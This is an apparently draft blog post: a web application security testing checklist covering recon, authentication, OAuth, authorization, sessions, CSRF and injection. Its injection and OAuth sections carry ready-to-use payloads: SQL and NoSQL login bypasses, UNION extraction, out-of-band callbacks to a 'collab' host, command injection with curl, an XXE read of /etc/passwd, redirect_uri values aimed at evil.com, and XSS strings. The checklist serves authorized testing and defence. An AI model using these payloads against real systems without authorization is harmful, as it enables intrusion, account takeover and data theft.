---
author: Kayra
pubDatetime: 2026-08-01T00:00:00Z
title: "Web Application Security Testing: A Working Checklist"
slug: web-application-security-testing
featured: false
draft: true
tags: ["security", "web", "pentest", "methodology"]
category: notes
description: A working web application testing checklist covering recon, authentication, authorization, sessions, every injection class, TLS and configuration, with the pass and fail condition for each check.
---

## Introduction

A checklist is only useful if each item tells you three things: how to test it, what a clean result actually looks like, and what proof to keep. Without the last two, "tested" degrades into "clicked around and nothing exploded", which is how missing cookie flags and CBC ciphers survive an assessment.

So every item below follows the same shape:

- **Test**: the action to run.
- **Pass**: what a correctly built application does.
- **Fail**: the specific signal that means it is broken.
- **Evidence**: what to capture so the result is defensible later.

Items are numbered by section (`INJ-02`, `SES-04`) so you can reference them in notes and reports without renumbering the whole thing when you insert something new.

## How to Run It

Do not work through this in order. The list is grouped by subject, and subject says nothing about cost. One `Set-Cookie` header settles six separate checks. One TLS scan settles an entire section. Meanwhile a single authorization pass can eat a day. Working top to bottom burns the clock on the cheap items and leaves the valuable ones unfinished.

### Run order

1. **Setup**: proxy running, scope defined, traffic capture on, dangerous forms identified and excluded.
2. **Launch the long scans and walk away**: a full TLS scan, a full port scan with service detection, an authenticated crawl and audit, and a fingerprinting pass. They run while you work.
3. **Batch the cheap reads**: cookie flags, response headers, the login request, client-side source. Roughly a third of the list, in about an hour.
4. **Manual work**: authentication, sessions, authorization, injection. This is where the serious findings are and it deserves most of the clock.
5. **Triage the scanner output**: verify every hit by hand. Kill the false positives, confirm the real ones.
6. **Configuration review**: fit around everything else.

### One action, many checks

| One action | What it settles |
|---|---|
| A full TLS scan | `TLS-01` through `TLS-04` |
| Reading one `Set-Cookie` header | All of `SES-02` |
| Reading one response's headers | `REC-01`, `INJ-16`, `CFG-06`, part of `LEA-04` |
| Capturing one login request | `AUT-07`, part of `SES-01` and `SES-03` |
| A port scan with service detection | `REC-03`, `CFG-01`, `LEA-04` |
| One client-side source sweep | `REC-02`, `LEA-03`, DOM sinks for `INJ-06` |
| A two-account replay session | `AUZ-01`, `AUZ-02`, `AUZ-03` |

### When time runs out

Impact order, if you cannot finish everything:

1. **Authentication and session**: `AUT-01`, `AUT-08`, `AUT-10`, `SES-03`, `SES-04`.
2. **Authorization**: `AUZ-01` through `AUZ-03`. Consistently the highest-value web findings.
3. **Injection**: `INJ-02`, `INJ-03`, `INJ-06`, `INJ-08`, `INJ-13`, `INJ-14`. Plant the blind XSS payloads on day one so the callbacks have time to arrive.
4. **TLS, headers and cookies**: the cheap batch, high value per minute.
5. **Configuration review**: last.

### Testing a large application

You cannot test every input on a large application, so sample rather than enumerate. Pick representative endpoints per function type (one list view, one detail or edit view, one upload, one search, one administrative action) and test those thoroughly instead of testing every field shallowly.

Cover every authentication and state-changing flow without exception: login, registration, password reset, payment, role change, export. Depth there beats breadth everywhere else. Record what you sampled and what you skipped, so the coverage gaps are explicit rather than silent.

## REC: Reconnaissance

### REC-01: Platform and version fingerprinting

**Test:** identify the platform, framework and versions, then map them to known vulnerabilities.

```bash
whatweb https://target
nmap -p- -sV target
curl -sI https://target | grep -iE "server|x-powered-by|x-aspnet|x-generator"
```

Version information also leaks from default error pages and from files like `/server-status`, `/phpinfo.php` and CMS changelogs.

- **Pass**: the stack is identifiable but versions are suppressed or generic, and nothing running maps to a public exploit.
- **Fail**: a precise version is disclosed anywhere, or a fingerprinted version matches a known CVE.
- **Evidence**: the fingerprint output and any CVE references.

### REC-02: Client-side source and comments

**Test:** collect every HTML response and linked script, beautify anything minified, then search for what should not be there.

```bash
grep -rinE "todo|fixme|password|secret|api[_-]?key|token|internal|debug|jdbc|mongodb" ./client_files/
```

Run SecretFinder, LinkFinder, `trufflehog` or `gitleaks` over the same set, since they find hardcoded credentials and undocumented endpoints faster than reading does. Check the end of every bundle for a `//# sourceMappingURL=` comment, which often rebuilds the original source in full.

- **Pass**: only presentation code reaches the browser, with no credentials, internal hostnames, keys or revealing developer notes.
- **Fail**: any credential, API key, internal URL, hidden administrative path or usable source map is retrievable.
- **Evidence**: the offending snippet and the URL it came from.

### REC-03: Exposed services and interfaces

**Test:** full port scan, then confirm every exposed service requires authentication. Look for administrative interfaces reachable from the internet (`/admin`, database consoles, application server managers, monitoring endpoints, CI dashboards) and for web service definitions (`?wsdl`, `.asmx`, `/services/`), enumerating the operations they expose.

- **Pass**: only required services are exposed, all of them authenticated, with administrative interfaces restricted to internal networks.
- **Fail**: anonymous service access, an internet-reachable administrative console, or a web service exposing sensitive operations without authentication.
- **Evidence**: the scan output and the access test against each exposed service.

## AUT: Authentication

### AUT-01: Authentication cannot be bypassed

**Test:** work through all of these against protected pages and API endpoints:

- **Forced browsing**: request post-login URLs directly with no session at all.
- **Response tampering**: intercept the authentication response and flip `false` to `true`, or `401` to `200`.
- **SQL injection in the login form**: see `INJ-02`.
- **Parameter and cookie manipulation**: `authenticated=false`, `isAdmin=0`, any role value carried client-side.
- **Session fixation and token removal**: does the application fail open when the token is missing?

A JavaScript redirect is not an access control. If removing the redirect gives you the page content, the check was never server-side.

- **Pass**: every protected resource rejects unauthenticated requests with a 401 or a redirect, and no tampering technique reaches protected content.
- **Fail**: any technique returns protected data or executes a protected function.
- **Evidence**: the request and response showing the bypass, plus a video for anything reaching real data.

### AUT-02: One authentication path

**Test:** enumerate every way into the application, not just the one the interface offers. Legacy login pages, mobile API endpoints, API keys, and secondary SSO paths.

- **Pass**: a single authentication method against a single credential store.
- **Fail**: more than one path in, especially a legacy login that skips the controls the main one enforces.
- **Evidence**: the list of login endpoints found and what each one accepts.

### AUT-03: Password policy on every entry point

**Test:** a rule enforced at registration is often missing at administrative reset, so test all four flows separately: registration and initial set, administrative reset, self-service reset, and user-initiated change. In each, try passwords that are too short, all lowercase, purely numeric, the username itself, and common dictionary passwords. Strip the client-side validation and resubmit to confirm the check is server-side.

Also confirm blank passwords are rejected, including when the parameter is removed entirely rather than just left empty.

- **Pass**: complexity, length and blocklist rules are enforced server-side in all four flows.
- **Fail**: any flow accepts a password that breaks the rule, or accepts a blank or missing password parameter.
- **Evidence**: the request and response for each flow where a weak password was accepted or rejected.

### AUT-04: Password change and reset flow integrity

**Test:** on the change form, submit a wrong current password and then remove the `current_password` parameter entirely. On the reset flow, trigger a reset and follow it end to end, watching where the token comes from and whether it can be skipped, guessed, or read out of the response body.

Also check that a confirm-password field is validated server-side, that a change triggers a notification email, and that the reset token is single use and short-lived.

- **Pass**: changes require the correct current password, resets require a token delivered out of band, and both are validated server-side.
- **Fail**: a password changes without the current one, a reset completes without the emailed token, or the token is predictable or returned in a response.
- **Evidence**: the request and response for the tampered change, plus the reset email and full flow.

### AUT-05: Password storage and recoverability

**Test:** black-box, you infer this. Check whether any function emails or displays an existing password rather than resetting it, and whether any administrative screen shows user passwords. Check client storage, JavaScript variables and hidden fields for cached credentials.

- **Pass**: only reset flows exist, the existing password is never retrievable, and credentials appear nowhere in client storage.
- **Fail**: the application emails or displays an existing password, which proves reversible storage rather than a one-way hash. Credentials found in `localStorage`, a cookie or a hidden field fail this too.
- **Evidence**: the email or screen containing the original password, or the storage inspection showing cached credentials.

> **Note:** where the application authenticates against a directory service, most of `AUT-03` and `AUT-04` is enforced by the directory rather than the application. Determine the authentication model first, then focus on what the application still owns: not displaying passwords, not caching credentials client-side, and rejecting blank passwords.

### AUT-06: Account lockout and brute force

**Test:** send repeated failed logins against an account you control and watch for lockout or throttling. Then check whether an attacker can trigger that lockout against arbitrary users.

- **Pass**: the account locks or throttles after a threshold, and lockout cannot be weaponised against other users.
- **Fail**: unlimited attempts, which opens credential brute force. Note lockout an attacker can trigger on other accounts separately, as a denial of service angle.
- **Evidence**: the run showing attempt count with no lockout, or the lockout threshold reached.

### AUT-07: Credential transport and form handling

**Test:** capture the login request and read four things: the method, the scheme of the page serving the form, the scheme of the endpoint receiving it, and the authentication header type.

- **Pass**: credentials in a POST body, the login page itself served over HTTPS with an HTTP redirect in place, and form or token authentication rather than Basic or Digest.
- **Fail**: credentials in a query string, which leak into history, proxy logs, server logs and the `Referer` header. Also fails if the login page is served over HTTP even when it posts to HTTPS, since the form can be modified in transit before the user types anything. `WWW-Authenticate: Basic` fails, since Basic resends base64 credentials on every request.
- **Evidence**: the login request and the redirect behaviour.

### AUT-08: Multi-factor cannot be bypassed

**Test:** five distinct ways this breaks, and they are worth trying all of them:

1. **Forced browsing**: after submitting valid credentials, request a post-MFA URL directly.
2. **Response tampering**: flip the verification response from failure to success.
3. **Parameter drop**: remove or blank the code parameter.
4. **Brute force**: with no rate limit, a six digit code is a short list.
5. **Reuse and cross-user**: replay a previous code, or use a code issued to a different account.

- **Pass**: verification is enforced server-side and none of the five reaches the protected area.
- **Fail**: any technique grants access without a valid code.
- **Evidence**: the request and response for the bypass, plus a video. This is the single highest severity finding on the list, so the proof needs to be unambiguous.

### AUT-09: One-time code quality

**Test:** collect several codes and compare them. Check length, look for sequential values, a small range or a static code, then request one and use it after the documented expiry window.

- **Pass**: codes are at least six characters, unpredictable across samples, and rejected after their stated lifetime.
- **Fail**: short codes, a visible pattern, or a code that still works well past expiry.
- **Evidence**: the sample codes side by side and the timed expiry result. Record the lifetime you actually measured rather than the documented one.

### AUT-10: OAuth and OIDC flow integrity

"Log in with Google" is standards-compliant and still routinely gives up full account takeover, because the standard describes the flow and not the validation. The confusion underneath most of these is that OAuth is authorization delegation, not authentication. Applications that treat "the identity provider returned a token" as "this person is who they claim to be" produce the account linking flaw below.

**Test:** capture the full redirect chain, then work through it.

1. **`redirect_uri` validation**, the one that matters most:

```text
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com          suffix match bug
redirect_uri=https://evil.com?target.com          prefix match bug
redirect_uri=https://target.com@evil.com          userinfo trick
redirect_uri=https://target.com/../../evil        traversal in the allowlist
redirect_uri=https://target.com/redirect?to=https://evil.com   chained open redirect
```

If the authorization code lands on a host you control, that is account takeover. Note the last variant: an open redirect you would otherwise rate low (`INJ-11`) becomes critical the moment it sits on an OAuth-allowlisted host.

2. **The `state` parameter**: remove it and see whether the callback still completes. Missing, static or unvalidated means CSRF on the callback, which lets an attacker link their own identity provider account to a victim's session, or silently log a victim into an attacker-controlled account.
3. **Implicit flow**: `response_type=token` puts the access token in the URL fragment, where it leaks through `Referer`, history and logs.
4. **PKCE downgrade**: drop `code_challenge` entirely, or send `code_challenge_method=plain` with the verifier equal to the challenge.
5. **Code reuse**: replay a consumed authorization code.
6. **Scope escalation**: raise `scope` in the authorization request and again at token exchange, then check what was actually granted.
7. **Token verification**: for OIDC, try `alg=none`, RS256 to HS256 key confusion, a token with a different `aud` or `iss`, and a missing `nonce` check.
8. **Account linking on an unverified email**: does the application link an identity provider account to an existing local account purely on the `email` claim, without checking `email_verified`?
9. **Client secret exposure**: grep the JavaScript bundle and any mobile client for it.

- **Pass**: exact-match `redirect_uri` allowlist, `state` present and validated, authorization code with PKCE, codes single use and short-lived, `id_token` signature and `aud`, `iss` and `nonce` all verified, and account linking gated on a verified email.
- **Fail**: any of the nine. A code or token landing on a host you control is account takeover, and an accepted forged `id_token` is the same. Missing `state` is a tier below.
- **Evidence**: the full request chain showing the tampered parameter and where the code or token ended up, plus a video for anything reaching takeover.

### AUT-11: Re-authentication for sensitive actions

**Test:** while logged in, change the password or email, make a payment, and change a role. Watch for a step-up prompt.

- **Pass**: sensitive functions require re-authentication.
- **Fail**: they execute on session alone, which turns any hijacked session into a full account takeover.
- **Evidence**: the action flow showing no re-authentication step.

## AUZ: Authorization

Authorization is about who may do and see what, checked on every request, server-side. Hiding a function from the menu is not a control.

Set up before starting: one low-privilege account, one high-privilege account, and an unauthenticated session. The method throughout is to capture a request as one user, replay it with another user's token or no token, and read what comes back.

### AUZ-01: Horizontal access control

**Test:** as user A, try to read or modify user B's data by changing an identifier: `id=`, account number, document ID, GUID, in URLs, parameters, JSON bodies and API paths.

- **Pass**: you can only reach your own data. Another user's identifier returns 403, empty, or not found.
- **Fail**: changing an identifier returns or modifies another user's record.
- **Evidence**: the request and response showing another user's data, with both accounts identified.

### AUZ-02: Vertical access control

**Test:** as a low-privilege user, invoke privileged functionality directly: administrative URLs, API endpoints, actions hidden from your menu. Capture an administrative request with the high-privilege account and replay it with the low-privilege session.

- **Pass**: privileged functions reject unauthorized roles.
- **Fail**: a low-privilege user executes a privileged function.
- **Evidence**: the request and response showing the low-privilege session performing the privileged action.

### AUZ-03: Authorization bypass techniques

**Test:** the techniques that get past a check which exists but is incomplete:

- **Parameter tampering**: `role=user` to `role=admin`, `isAdmin=true`, swapping a user ID.
- **Forced browsing**: privileged pages and endpoints requested directly.
- **HTTP method change**: `GET` to `POST`, or `PUT` and `DELETE`, against a function that only guards one method.
- **Mass assignment**: add `role` or `isAdmin` to a profile update request and see if they stick.
- **Header manipulation**: where the application trusts client-supplied role hints or forwarded headers.

- **Pass**: authorization is enforced server-side on every request, for the object and the action, not just the route.
- **Fail**: any technique grants unauthorized access.
- **Evidence**: the request and response for the bypass, plus a video.

### AUZ-04: GraphQL resolver authorization

GraphQL is a surface rather than a vulnerability class, and it breaks several checks at once. The recurring pattern: the application authenticates at the endpoint and forgets to authorize at the resolver, so one authenticated session can read everything.

**Test:** find it at `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphiql` or `/gql` and confirm with a `__typename` query, then pull the schema:

```bash
curl -s https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'

curl -s https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name args{name}}}}}"}'
```

If introspection is disabled, `clairvoyance` rebuilds the schema from field suggestion errors, and the suggestions themselves ("Did you mean `userEmail`?") leak field names, so check whether those are switched off too. InQL, `graphw00f` and `graphql-cop` cover the rest. Then run four tests:

- **Object-level authorization**: as one user, request another user's node directly with `{user(id:2){id email phone}}`.
- **Field-level authorization**: ask for sensitive fields on your own object (`{me{id email role passwordHash isAdmin}}`) and call privileged mutations with a low-privilege token.
- **Batching and aliasing**: rate limits usually count requests rather than operations, so one request carrying a hundred aliased attempts walks past them. This is the practical way an OTP brute force survives the lockout control in `AUT-06`.

```json
{"query":"{ a: login(u:\"x\",p:\"0001\") b: login(u:\"x\",p:\"0002\") }"}
```

- **Injection through arguments**: every payload from the `INJ` section belongs in the variables, since resolvers hit the same backends as everything else.

Deeply nested or circular queries can exhaust the server. Note the absence of depth and complexity limits rather than testing it live, unless denial of service testing is explicitly authorized.

- **Pass**: introspection and suggestions disabled in production, authorization enforced inside every resolver for objects and fields, batching capped, and query depth and complexity limited.
- **Fail**: the schema dumps to an unauthenticated caller, any cross-user object or privileged mutation resolves, or batching bypasses a rate limit.
- **Evidence**: the query and response showing another user's data or the privileged mutation succeeding. Rate it as the IDOR or privilege escalation it is.

## SES: Session Management

### SES-01: Token generation

**Test:** collect a large sample of tokens and analyse the entropy with a sequencer. Eyeball them for sequential values, embedded timestamps, or anything that decodes into meaningful data such as a username or role. Test the pre-login token as well as the post-login one, since some applications only randomise one of them.

- **Pass**: long, high-entropy, unpredictable tokens both before and after login, generated by the platform's session management rather than a custom implementation.
- **Fail**: predictable, sequential or low-entropy tokens, or a token that decodes into meaningful data.
- **Evidence**: the sequencer report and a set of raw token samples.

### SES-02: Cookie attributes

**Test:** capture the login response and read the `Set-Cookie` header for the session cookie. One header answers all six, and missing flags are easy to skim past.

| Attribute | What it does | What its absence means |
|---|---|---|
| `HttpOnly` | Blocks JavaScript from reading the cookie | XSS can steal the session token |
| `Secure` | Cookie sent only over HTTPS | The token can ride over plaintext HTTP |
| `SameSite` | Controls cross-site sending | `None` or unset leaves CSRF open |
| `Domain` | Scopes the cookie to a host | A broad scope sends the token to subdomains that do not need it |
| `Path` | Scopes the cookie to a path | Usually minor, still worth noting |
| No `Expires` or `Max-Age` | Session cookie, cleared on browser close | A persistent cookie keeps the session alive after the browser closes |

- **Pass**: `HttpOnly` and `Secure` set, `SameSite` at `Lax` or `Strict`, `Domain` scoped to the exact host needed, and no persistence on the session cookie.
- **Fail**: any of the first three missing. Treat a broad `Domain` and a persistent session cookie as findings in their own right.
- **Evidence**: the raw `Set-Cookie` header, plus the reopen test for persistence.

### SES-03: Token regeneration on login

**Test:** record the session cookie before authenticating, log in, then compare.

- **Pass**: a new token is issued on authentication.
- **Fail**: the same token before and after, which is session fixation.
- **Evidence**: the before and after token values side by side.

### SES-04: Logout invalidation

**Test:** log in, save the token, log out, then replay an authenticated request with the old token. Separately, confirm the logout response clears the cookie.

- **Pass**: the old token is rejected server-side after logout and the cookie is cleared.
- **Fail**: the old token still works, which means the logout only happened in the browser. This is common and genuine.
- **Evidence**: the replayed request showing the old token still valid after logout.

### SES-05: Session timeouts

**Test:** three separate properties. Idle past the inactivity window and send a request. Keep a session actively in use and check whether it is eventually killed regardless. Leave the application open and idle while watching the proxy history for background requests.

- **Pass**: an inactivity timeout expires idle sessions, an absolute lifetime caps even active ones, and nothing polls in the background to keep sessions alive.
- **Fail**: a session valid after the documented idle window, one that lives indefinitely while in use, or a keep-alive request that defeats the inactivity timeout entirely.
- **Evidence**: the timed test results and the periodic requests in proxy history.

### SES-06: Concurrent sessions

**Test:** log in as the same user from two browsers at once.

- **Pass**: the second login invalidates the first, where the application's threat model calls for it.
- **Fail**: unlimited simultaneous sessions with no visibility into them.
- **Evidence**: both sessions shown active at the same time.

### SES-07: Token storage and transport

A cookie is a transport and storage mechanism. A token is the credential itself. A token can live inside a cookie, and the two architectures differ in what they expose:

| | Session cookie | Token (JWT) |
|---|---|---|
| What it is | Opaque ID pointing at server-side state | Self-contained signed claims |
| State | Stateful, the server stores a session | Stateless, the server verifies a signature |
| Transport | `Cookie` header, sent automatically | Usually `Authorization: Bearer`, sent by JavaScript |
| Revocation | Easy, delete it server-side | Hard, valid until it expires |
| CSRF | Exposed, since it is sent automatically | Not exposed, if carried in a header |
| XSS | Protected by `HttpOnly` | Exposed if stored in `localStorage` |

**Test:** locate the session token and determine how it is carried.

- **Pass**: the token travels in a cookie with the attributes from `SES-02`, or as a bearer token in a header. A bearer token in `localStorage` is not an automatic fail, since `HttpOnly` only applies to cookies. Assess it as a trade-off against how strong the XSS prevention is and how short-lived the token is.
- **Fail**: a session token in the URL, which leaks through `Referer`, logs and history. This is unambiguous in either architecture.
- **Evidence**: the requests showing where the token lives.

### SES-08: Client-side session state

Some frameworks serialize state and hand it to the page to be sent back on the next request. ASP.NET `__VIEWSTATE` is the well-known example, and Java JSF, Rails signed cookies, Flask signed cookies and JWTs all do a version of it. Two separate properties matter.

**Test:** for integrity, find the hidden state field, decode it, change a value, re-encode and resubmit. Burp's inspector reports MAC status for ViewState directly. For binding, capture one user's state token and replay it inside another user's session.

- **Pass**: the state is signed so tampering is detected, and bound to the user so it cannot be replayed across sessions.
- **Fail**: the server accepts and acts on a modified value, or accepts one user's signed state inside another user's session.
- **Evidence**: the decoder output showing MAC status, plus the tamper and replay requests.

### SES-09: Session variable reuse

**Test:** map where session variables get set across different entry points. The vulnerability appears when a variable set by one flow is later trusted by another. A password reset that stores a username in the session, and an authenticated area that reads that same username, together allow access without ever logging in. Try to reach a protected area by populating the session through an unauthenticated flow.

- **Pass**: session variables are not reused across trust boundaries.
- **Fail**: you authenticate or escalate by populating a session variable through an alternate flow.
- **Evidence**: the full request sequence that demonstrates it.

### SES-10: Cross-Site Request Forgery

The browser attaches cookies to every request to a site, including requests triggered by a different site. So a malicious page can make a victim's browser submit to an application where they are logged in, and the application sees a valid session and executes the action. The attacker never reads the token, they just make the browser fire the request.

Either defence can carry the weight. An anti-CSRF token is an unpredictable per-session value embedded in the page and required back on submission, which a cross-site attacker cannot read. The `SameSite` attribute controls whether the cookie is sent at all:

| Value | Sent on cross-site requests | Effect |
|---|---|---|
| `Strict` | Never | Strongest, can break inbound links into an authenticated area |
| `Lax` | Only top-level GET navigations | Blocks most CSRF, and is the modern browser default |
| `None` | Always, and requires `Secure` | No protection |

With `SameSite=Lax` a cross-site POST arrives without the cookie, so the forged request is unauthenticated. The gap is that Lax still permits cross-site GET, so a state-changing GET is not protected by `SameSite` alone.

**Test:** enumerate every state-changing request. For each, remove or reuse the anti-CSRF token, read the cookie's `SameSite` value, and build a cross-site auto-submitting proof of concept.

- **Pass**: state-changing requests require an unpredictable server-validated token, or the session cookie is `SameSite=Lax` or `Strict`.
- **Fail**: the request is accepted with the token removed while the cookie is `SameSite=None` or unset. A state-changing GET is a finding regardless of the token, since `SameSite` will not cover it.
- **Evidence**: a working proof of concept page, or the request accepted with the token stripped.

## INJ: Injection

The general method is the same for every class. For every input, inject the payload, then read the response for the specific signal that class produces: a reflected payload, a database error, a time delay, a changed result set, an out-of-band callback. "No error" is not a pass, because you are looking for a particular signal rather than the absence of a crash.

**Where to send payloads:** every input the backend might use. URL parameters, body fields, JSON fields, headers, cookies, filenames, and search, filter, sort and ID parameters. High-yield parameters that get skipped: `sort` and `order`, because an `ORDER BY` clause cannot be parameterised and this is a classic real finding; `limit`; and `User-Agent` or `X-Forwarded-For` wherever they are written to a database.

You do not know the backend in advance, so throw the payloads and let the response identify it. Context sets the priority: authentication against a directory suggests LDAP, data-driven pages suggest SQL, and the error text usually names the technology outright.

### INJ-01: Input validation baseline

**Test:** submit out-of-spec input to each field: wrong type, over-long strings, and special characters the field has no use for. Confirm the constraint is server-side by stripping client-side validation.

- **Pass**: input is constrained to expected characters, length and type, server-side, against an allowlist.
- **Fail**: the field accepts arbitrary characters and length. This is the root cause behind most of the findings below, so it is worth reporting on its own even where nothing else lands.
- **Evidence**: the request and response showing over-long or special-character input accepted.

### INJ-02: SQL injection

Work this ladder in order and stop at the first solid signal.

**Establish the context first.** A single quote only probes a string context. Numeric parameters need their own probes, and skipping this is exactly how numeric injection points get written off as safe:

```text
string    '     "     ')     ''     \
numeric   1 AND 1=1   vs   1 AND 1=2     same page vs different page means injectable
          2-1         vs   1             same record returned means the arithmetic was evaluated
```

**Error-based.** Send `'`, then send `''`. An error on the first that disappears with the second is the cheapest strong signal available, because it means the quote reached the SQL parser. The error text usually names the database as a bonus.

**Boolean-blind.** When errors are suppressed, compare two requests that differ only in truth value, and judge on response length and body rather than status code:

```text
' AND '1'='1'-- -     normal page      (TRUE)
' AND '1'='2'-- -     different/empty  (FALSE)
1 AND 1=1  /  1 AND 1=2        numeric equivalent
```

Once that pair works you have an oracle, and you can extract data one character at a time:

```sql
' AND (SELECT COUNT(*) FROM users)>0-- -
' AND SUBSTRING((SELECT @@version),1,1)='8'-- -
```

**Time-based.** For when there is no visible difference at all. Take a baseline first with the same request and no delay payload, then repeat any hit three times, because network jitter fakes this constantly and a single unverified five second response is how false positives get reported.

| Database | Time-delay payload | Version | Comment | Concat |
|---|---|---|---|---|
| MySQL / MariaDB | `' OR IF(1=1,SLEEP(5),0)-- -` | `@@version` | `-- -` or `#` | `CONCAT(a,b)` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` | `@@version` | `--` | `a+b` |
| PostgreSQL | `'; SELECT pg_sleep(5)--` | `version()` | `--` | `a\|\|b` |
| Oracle | `' \|\| dbms_pipe.receive_message(('a'),5) FROM dual--` | `banner FROM v$version` | `--` | `a\|\|b` |
| SQLite | `' AND 1=randomblob(500000000)--` | `sqlite_version()` | `--` | `a\|\|b` |

> **Gotcha:** the `--` comment needs a trailing space to be valid, so always write `-- -`. And Oracle requires a `FROM` on every query, so use `FROM dual` when you have no table to name.

**UNION**, for when the query's result set is rendered on the page:

```sql
-- 1. column count
' ORDER BY 1-- -    ' ORDER BY 2-- -    until it errors; the count is the last one that worked
' UNION SELECT NULL-- -    adding NULLs until the error stops

-- 2. find a column that accepts text
' UNION SELECT NULL,'a',NULL-- -        swap each NULL in turn

-- 3. pull data
' UNION SELECT NULL,@@version,NULL-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -
```

**Out-of-band**, the last resort and the only proof available when the injection is fully blind:

```sql
MSSQL       '; EXEC master..xp_dirtree '\\collab\a'--
Oracle      ' || UTL_HTTP.request('http://collab/') FROM dual--
PostgreSQL  '; COPY (SELECT '') TO PROGRAM 'nslookup collab'--
MySQL       ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.collab\\a'))-- -
```

An out-of-band channel that executes commands is also evidence that the database service account is over-privileged, which is worth writing up separately.

**Authentication bypass.** Put these in the username field first, because if the query short-circuits the password is never evaluated:

```text
admin'-- -        admin'#           admin'/*
' OR 1=1-- -      ' OR '1'='1       ' OR 1=1 LIMIT 1-- -
') OR ('1'='1     " OR ""="         ' OR 1=1;-- -
```

With a known valid username, `admin'-- -` comments the password check away and logs you in as that user, which is the same finding as `AUT-01`. A database error here counts even when the login still fails.

**With `sqlmap`**, use flags that actually test something:

```bash
sqlmap -r req.txt -p id --level=5 --risk=3 --batch --random-agent
sqlmap -r req.txt -p id --dbms=mysql --technique=BEUSTQ --tamper=space2comment
```

A bare `-r` runs at level 1 and risk 1, tests a small payload set, and skips headers and cookies entirely, so do not call a parameter clean off a default run.

> **Danger:** `--dump`, `--os-shell`, `--file-write` and `--risk=3` (which includes `OR`-based payloads that can update rows) are destructive and noisy. Only run them with explicit written authorization.

- **Pass**: queries are parameterised and payloads are treated as literal data, with no error, no delay and no change in the result set.
- **Fail**: a database error, an injected time delay confirmed across repeats, a changed result set, or an out-of-band callback.
- **Evidence**: the request and response showing the error, the delay with its baseline, the extracted data, or the callback. Add a video for anything reaching data.

### INJ-03: NoSQL injection

Any application on MongoDB, CouchDB, Elasticsearch or Redis is in scope, and the payloads look nothing like SQL, so an SQL-only sweep goes straight over the top of it. The highest-yield target is a JSON login endpoint.

**Test:** detect it by sending `'`, `"`, `\`, `{` and `}` and reading the error. A `MongoError`, a `CastError`, an unterminated string, or a BSON parse error identifies the backend. Then swap a string for an operator object, which is the key move:

```json
{"username":"admin","password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":"^a"}}
```

The first logs in without knowing the password, the second logs in as whichever user comes first in the collection, and the third is an oracle for blind extraction. Where the application parses nested parameters, the form-encoded equivalent works just as well:

```text
username=admin&password[$ne]=1
username[$ne]=x&password[$ne]=x
```

Where the application builds a JavaScript predicate, `$where` injection applies:

```text
admin'||'1'=='1          admin' || 1==1//
{"$where":"sleep(5000)||true"}     time-based confirmation
```

For blind extraction, walk the value with `$regex` one character at a time. A different response means the prefix was correct. NoSQLMap automates it, and Burp Intruder handles short values fine.

- **Pass**: input is cast and validated to the expected type server-side, so operator objects and JavaScript are rejected as data.
- **Fail**: an operator object authenticates, alters the result set, or produces the injected delay.
- **Evidence**: the request and response showing the operator payload accepted. An authentication bypass here carries the same weight as `INJ-02` against a login form, so record a video.

### INJ-04: OS command injection

**Test:** target fields that plausibly shell out: ping and DNS tools, file conversion, archive handling, image processing, backup and export functions. Send both operating system families, since you do not know what is underneath until something answers.

```text
Unix       ; id        | whoami      `id`      $(id)      %0a id
Windows    & whoami    | dir         && ver    %0a whoami
time-based ; sleep 5             & ping -n 6 127.0.0.1     (Windows has no sleep)
blind OOB  ; ping -c1 collab     & nslookup collab         ; curl http://collab
```

Three things make the difference between finding this and missing it:

- **URL-encode the separators** in query strings and form bodies, or they get eaten as parameter delimiters: `&` becomes `%26`, `;` becomes `%3B`, a newline becomes `%0a`.
- **Break out of quoting** if the value is quoted server-side: `" & whoami &` or `' ; id ;'`.
- **Use DNS for blind Windows targets.** Outbound HTTP is often filtered where DNS is not, so `nslookup collab` is the more reliable probe.

- **Pass**: no user input reaches a shell, or it is passed as an argument array rather than concatenated into a command string.
- **Fail**: command output in the response, an injected delay, or an out-of-band callback.
- **Evidence**: the request and response showing the output or the callback, plus the identity the command ran as if you can retrieve it.

### INJ-05: LDAP, XPath and XXE

**Test:** you cannot know which of these a field feeds in advance, so send the full set at login, search and lookup fields and let the error type identify the backend.

- **LDAP**, in login and search fields: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)`, `*)(|(password=*))`.
- **XPath**, in any field feeding an XPath query rather than only XML bodies: `' or '1'='1`, `') or ('1'='1`, `x' or name()='username' or 'x'='y`. XPath shares the boolean logic of SQL but has no comment syntax, while LDAP breaks on `)`, `(`, `*`, `|` and `&` instead.
- **XXE**, only where the application parses an XML body such as SOAP, an XML upload, an SVG or a SAML assertion:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

A `javax.naming.directory` error means LDAP, an `XPathException` means XPath, and `SQL syntax` or `ORA-` means SQL.

- **Pass**: queries are parameterised or escaped for their language, and the XML parser has external entities disabled.
- **Fail**: a directory or parser error, an altered result set, an authentication bypass, or file contents returned through an entity.
- **Evidence**: the request and response showing the error or the returned file.

### INJ-06: Cross-Site Scripting

Three types. **Reflected** is echoed straight back in the response. **Stored** is saved and served to other users. **DOM** is purely client-side, where JavaScript reads an attacker-controlled source and writes it to a dangerous sink, and the server may never see the payload at all.

The starter set:

```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

**Context decides the payload.** Do not fire the same string at every field. Send a harmless marker first, find where in the response it lands, then pick the payload for that context. Most "not vulnerable" conclusions are really "wrong payload for the context":

| Where the input lands | Escape it with | Payload |
|---|---|---|
| HTML body or text node | Nothing to break | `<img src=x onerror=alert(1)>` |
| Quoted attribute, `value="HERE"` | `"` | `" autofocus onfocus=alert(1) x="` |
| Unquoted attribute, `value=HERE` | A space | ` onmouseover=alert(1)` |
| Inside a script, `var a='HERE'` | `'` | `'-alert(1)-'` or `';alert(1);//` |
| Inside an existing handler | `')` | `');alert(1);//` |
| `href`, `src` or `action` | The scheme | `javascript:alert(1)` |
